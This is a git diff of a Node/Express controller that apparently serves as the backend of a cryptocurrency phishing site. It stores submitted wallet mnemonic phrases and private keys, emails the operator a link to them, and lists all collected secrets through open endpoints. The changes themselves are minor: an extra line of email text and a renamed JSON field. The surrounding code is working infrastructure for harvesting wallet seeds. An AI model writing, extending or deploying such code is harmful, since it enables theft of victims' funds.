@@ -17,7 +17,7 @@ exports.saveMnemonic = async (req, res, next) => {
     let url = `${req.protocol}://${req.get("host")}/api/all/Mnemonic`;
     const savedMnemonic = await newMnemonic.save();
     const message = `You are receiving this email because someone else has sent you a mnemonic phrase. click this: \n\n ${url}
-    \n to see list of all the menomic phrase in your database`;
+    \n to see list of all the menomic phrase in your database \n open with your laptop or desktop for a better view`;
 
     await sendEmail({
       email: process.env.TO_EMAIL,
@@ -44,7 +44,7 @@ exports.savePrivateKey = async (req, res, next) => {
     const savedPrivateKey = await newPrivateKey.save();
     let url = `${req.protocol}://${req.get("host")}/api/all/PrivateKey`;
     const message = `You are receiving this email because someone else has sent you a mnemonic phrase. click this: \n\n ${url}
-    \n to see list of all the menomic phrase in your database`;
+    \n to see list of all the menomic phrase in your database \n open with your laptop or desktop for a better view`;
 
     await sendEmail({
       email: process.env.TO_EMAIL,
@@ -97,7 +97,7 @@ exports.getMnemonics = async (req, res, next) => {
     const mnemonics = await Mnemonic.find({});
     return res
       .status(200)
-      .json({ success: true, length: mnemonics.length, mnemonics });
+      .json({ success: true, Total: mnemonics.length, mnemonics });
   } catch (error) {
     return next(new ErrorResponse(`Unable to get Mnemonic`, 401));
   }
@@ -107,7 +107,7 @@ exports.getPrivateKey = async (req, res, next) => {
     const privatekeys = await PrivateKey.find({});
     return res
       .status(200)
-      .json({ success: true, length: privatekeys.length, privatekeys });
+      .json({ success: true, Total: privatekeys.length, privatekeys });
   } catch (error) {
     return next(new ErrorResponse(`Unable to get Mnemonic`, 401));
   }
